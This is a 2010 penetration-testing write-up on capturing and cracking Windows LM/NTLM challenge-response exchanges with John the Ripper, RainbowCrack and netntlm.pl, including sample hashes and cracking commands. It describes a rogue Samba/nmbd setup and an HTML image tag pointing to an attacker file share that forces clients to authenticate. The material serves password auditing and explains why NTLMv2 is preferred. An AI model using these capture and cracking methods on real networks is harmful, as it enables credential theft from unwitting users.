LM/NTLM Challenge / Response Authentication
JoMo-Kun (jmk at foofus dot net) ~ 2010

Microsoft Windows-based systems employ a challenge-response authentication
protocol as one of the mechanisms used to validate requests for remote file
access. The configured/negotiated authentication type, or level, determines how
the system will perform authentication attempts on behalf of users for either
incoming or outbound requests. These requests may be due to a user initiating a
logon session with a remote host or, in some cases, transparently by an
application they are running. In many cases, these exchanges can be replayed,
manipulated or captured for offline password cracking. The following text
discusses the available tools within the John the Ripper "Jumbo" patch for
performing offline password auditing of these specific captured challenge-
response pairs.

Why might these exchanges be of interest? A primary point of most penetration
tests is to find avenues through which the assessor can gain unauthorized access
to some resource. This often relies on the compromise of a system's local
accounts or the exploitation of some service-level vulnerability. The ability to
capture on-the-wire authentication exchanges and to crack the associated
password adds another option to the mix. The fact that these exchanges can be
cracked aids in demonstrating to clients why one authentication algorithm may be
preferred to another.

A given server is likely to use one of the following protocols for
authentication challenge-response: LMv1, NTLMv1, LMv2 or NTLMv2. It should be
noted that these protocols may use the LM and NTLM password hashes stored on a
system, but they are not the same thing. For an excellent in-depth discussion of
the protocols see the Davenport paper entitled "The NTLM Authentication Protocol
and Security Support Provider" [1]. For the purposes of this discussion, the key
item of note is that the LMv1 and NTLMv1 protocols consist of a only a single
server challenge. This allows an attacker to force a client into authenticating
using a specific challenge and then attack that response using precomputed
Rainbow Tables.

There are a variety of methods for capturing challenge-response pairs, including
the use of tools such as MetaSploit and Ettercap. The author's preferred method
is to use a modified version of Samba[2]. The provided patch sets the server's
challenge to a fixed value (i.e. 0x1122334455667788) and logs all authentication
attempts in a format suitable for use with John. The patch also includes a
modification to the nmbd application. Nmbd is used to respond to broadcast
requests for NetBIOS name/IP information. The modified service simply responds
to all requests with its own IP address, often resulting in hosts unknowingly
authenticating to the wrong system. Another common method of forcing systems to
authenticate to the Samba server is through the use of HTML image source tags.
For example, simply inserting the tag "<img src=file://192.168.1.10/logo.gif>"
into a HTML message will cause some email client applications to automatically
perform an authentication attempt. Other examples include the use of specialized
desktop.ini files and many other mischievous tricks.

It is also worth noting that these challenge/response protocols are not limited
to the Microsoft File and Print Services. For example, Cisco's LEAP wireless
security mechanism, EAP-PEAP and PPTP all utilize a MS-CHAP handshake, or
modified variant. The NTLMv1 challenge/response set can be extracted from this
exchange and subjected to a brute-force guessing attack. Further discussion on
this subject is outside of the scope of this write-up, but would certainly
reveal numerous additional uses.

The LMv1 challenge-response mechanism suffers a number of technical limitations.
As previously noted, only a server challenge is used. This means that if the
challenge is set to a constant value, a given password will always result in
the same client authentication response. This allows for the precomputation of
password / LMv1 responses and their subsequent retrieval using tools such as
RainbowCrack.

To further exacerbate the issue, the LM hash used during the generation of the
LMv1 response converts a password into (at most) two 7 character upper-case
passwords. The LM hash is then split into three pieces prior to calculating the
LMv1 response. This process greatly reduces the size of the Rainbow Tables which
need to be calculated in order to break a given password. For example, the
so-called "halflmchall" tables widely available on the Internet utilize only the
first third of the LMv1 response to break the first 7 characters of the
respective password. The netnlm.pl script discussed in this document can be used
to attempt to break the remaining characters of the password and its original
case-sensitive version. The following is an example of cracking a captured
LMv1/NTLMv1 challenge/response set.

Example LMv1/NTLMv1 Challenge/Response (.lc Format):
user::WORKGROUP:5237496CFCBD3C0CB0B1D6E0D579FE9977C173BC9AA997EF:A37C5C9316D9175589FDC21F260993DAF3644F1AAE2A3DFE:112233445566778

LMv1 Response: 5237496CFCBD3C0CB0B1D6E0D579FE9977C173BC9AA997EF
NTLMv1 Response: A37C5C9316D9175589FDC21F260993DAF3644F1AAE2A3DFE
Server Challenge: 112233445566778

RainbowCrack look-up of password's first 7 characters (upper-cased) using first
third (8 bytes) of LMv1 response:
% rcrack halflmchall/*.rt -f 5237496CFCBD3C0C
Result: CRICKET

First netntlm.pl Pass (Crack Remaining Characters):
% netntlm.pl --file capture.lc --seed CRICKET
Result: CRICKET88!

Second netntlm.pl Pass (Determine Case Sensitive Password)[a]:
% netntlm.pl --file capture.lc
Result: Cricket88!

[a] Note that the case-sensitive password will be shown about a third through
the script's output following the text: "Performing NTLM case-sensitive crack
for account".

The following is an example of cracking a captured NTLMv1 challenge/response. If
the LMv1 and NTLMv1 response hashes within a given client response are
identical, it typically means one of two things: either the client machine is
configured to send only a NTLMv1 response (e.g. LAN Manager Authentication Level
Group Policy Object set to "Send NTLM response only"), or the user's password is
greater than 14 characters. If the password is indeed over 14 characters in
length, it is unlikely a suitable Rainbow Table set is available and brute-force
guessing will be exhaustively time-consuming.

Example NTLMv1 Challenge/Response (.lc Format):
user::WORKGROUP:A37C5C9316D9175589FDC21F260993DAF3644F1AAE2A3DFE:A37C5C9316D9175589FDC21F260993DAF3644F1AAE2A3DFE:1122334455667788

John Usage:
% john -format:netntlm capture.lc

The LMv2 and NTLMv2 challenge/response protocols both employ unique client
challenges. This additional data effectively defeats the ability to precompute
password/response pairs via Rainbow Tables. It should also be noted that
despite its name, the LMv2 response is computed using a NTLM hash. This results
in a much harder-to-crack response hash, as the password was not truncated to
seven characters or upper-cased during the process.

The use of NTLMv2 is now the default policy within Microsoft Windows Vista and
Windows 7. Its use can be enforced for older versions via the LAN Manager
Authentication Level Group Policy Object ("Send NTLMv2 response only" (level 3
or higher)).

Example LMv2 Challenge/Response (.lc Format):
user::WORKGROUP:1122334455667788:6FAF764ECFDF1D1D9E7BA7B517190F3B:E15C1A679C7609CE

John Usage:
% john -format:netlmv2 capture.lc

Example NTLMv2 Challenge/Response (.lc Format):
user::ATS-W759420A:1122334455667788:02E12C3C2B2F5799D2C1A7661AE80491:0101000000000000B0736308F1C9CA01DABA9E3A11AFD91F0000000002001000310030002E0030002E0032002E0032000000000000000000

John Usage:
% john -format:netntlmv2 capture.lc


[1] http://davenport.sourceforge.net/ntlm.html
[2] http://www.foofus.net/jmk/smbchallenge.html
